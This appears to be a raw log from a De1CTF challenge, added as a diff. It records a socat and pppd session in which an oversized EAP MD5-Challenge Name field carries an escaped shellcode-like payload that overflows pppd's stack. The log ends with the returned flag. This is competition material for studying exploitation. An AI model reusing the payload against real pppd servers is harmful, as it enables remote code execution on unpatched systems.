@@ -1,0 +1,52 @@
+2020/05/04 21:49:50 socat[25542] N PTY is /dev/pts/1
+2020/05/04 21:49:50 socat[25542] N opening connection to AF=2 134.175.208.201:8848
+2020/05/04 21:49:50 socat[25542] N successfully connected from local address AF=2 192.168.1.4:54722
+2020/05/04 21:49:50 socat[25542] N starting data transfer loop with FDs [5,5] and [7,7]
+tcpdump: listening on wlp3s0, link-type EN10MB (Ethernet), capture size 262144 bytes
+using channel 53
+Using interface ppp0
+Connect: ppp0 <--> /tmp/ppp
+sent [LCP ConfReq id=0x1 <asyncmap 0x0> <magic 0xf80b3999> <pcomp> <accomp>]
+rcvd [LCP ConfReq id=0x1 <asyncmap 0x0> <auth eap> <magic 0xaa3f28c8> <pcomp> <accomp>]
+sent [LCP ConfAck id=0x1 <asyncmap 0x0> <auth eap> <magic 0xaa3f28c8> <pcomp> <accomp>]
+sent [LCP ConfReq id=0x1 <asyncmap 0x0> <magic 0xf80b3999> <pcomp> <accomp>]
+rcvd [LCP ConfAck id=0x1 <asyncmap 0x0> <magic 0xf80b3999> <pcomp> <accomp>]
+sent [LCP EchoReq id=0x0 magic=0xf80b3999]
+rcvd [EAP Request id=0x5f Identity <Message "Name">]
+EAP: Identity prompt "Name"
+sent [EAP Response id=0x5f Identity <Name "admin">]
+rcvd [LCP EchoRep id=0x0 magic=0xaa3f28c8]
+rcvd [EAP Request id=0x60 MD5-Challenge <Value 93 bd d3 c9 72 e2 d5 1b 55 b2 d2 c6 6a d5 de ea b6 57 ff 3a> <Name "buildroot">]
+sent [EAP Response id=0x60 MD5-Challenge <Value 77 25 05 30 a3 79 6a b1 b4 b4 8e f2 f6 c9 44 6d> <Name "la\t</f)5\37777777770\37777777777\37777777651\37777777657\37777777630\37777777777\031$'H \003\37777777774\37777777777\37777777651\37777777657\37777777770\37777777777\37777777675'  \37777777640\003\37777777777\37777777777\005(\37777777645\017\0024\014\001\001\001\37777777774\37777777777\37777777642\37777777657\37777777774\37777777777\37777777661\37777777617\37777777777\000\007$E\000\t<\37777777760\37777777661)5\000\000$\37777777615 ( \002\37777777777\37777777777\006(o\020\0024\014\001\001\001\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\00
+rcvd [EAP Failure id=0x61]
+EAP: peer reports authentication failure
+sent [LCP TermReq id=0x2 "Failed to authenticate ourselves to peer"]
+rcvd [LCP TermReq id=0x2 "Authentication failed"]
+sent [LCP TermAck id=0x2]
+rcvd [proto=0x4465] 31 43 54 46 7b 50 70 50 64 5f 35 74 61 63 6b 4f 76 65 72 66 31 6f 77 5f 31 73 5f 31 6e 74 65 72 ...
+Discarded non-LCP packet when LCP not open
+rcvd [proto=0x4465] 31 43 54 46 7b 50 70 50 64 5f 35 74 61 63 6b 4f 76 65 72 66 31 6f 77 5f 31 73 5f 31 6e 74 65 72 ...
+Discarded non-LCP packet when LCP not open
+rcvd [proto=0x4465] 31 43 54 46 7b 50 70 50 64 5f 35 74 61 63 6b 4f 76 65 72 66 31 6f 77 5f 31 73 5f 31 6e 74 65 72 ...
+Discarded non-LCP packet when LCP not open
+rcvd [proto=0x4465] 31 43 54 46 7b 50 70 50 64 5f 35 74 61 63 6b 4f 76 65 72 66 31 6f 77 5f 31 73 5f 31 6e 74 65 72 ...
+Discarded non-LCP packet when LCP not open
+rcvd [proto=0x4465] 31 43 54 46 7b 50 70 50 64 5f 35 74 61 63 6b 4f 76 65 72 66 31 6f 77 5f 31 73 5f 31 6e 74 65 72 ...
+Discarded non-LCP packet when LCP not open
+rcvd [LCP TermReq id=0x2 "Failed to authenticate ourselves to peer"]
+sent [LCP TermAck id=0x2]
+rcvd [LCP TermAck id=0x2]
+Connection terminated.
+2020/05/04 21:50:00 socat[25542] N socat_signal(): handling signal 15
+2020/05/04 21:50:00 socat[25542] W exiting on signal 15
+2020/05/04 21:50:00 socat[25542] N socat_signal(): finishing signal 15
+2020/05/04 21:50:00 socat[25542] N exit(143)
+59 packets captured
+60 packets received by filter
+0 packets dropped by kernel
+---------------------------------------------------------
+}#De1CTF{PpPd_5tackOverf1ow_1s_1ntersT1ng}]}*}9E~
+}#De1CTF{PpPd_5tackOverf1ow_1s_1ntersT1ng}]}*}9E~
+}#De1CTF{PpPd_5tackOverf1ow_1s_1ntersT1ng}]}*}9E~
+}#De1CTF{PpPd_5tackOverf1ow_1s_1ntersT1ng}]}*}9E~
+}#De1CTF{PpPd_5tackOverf1ow_1s_1ntersT1ng}]}*}9E~
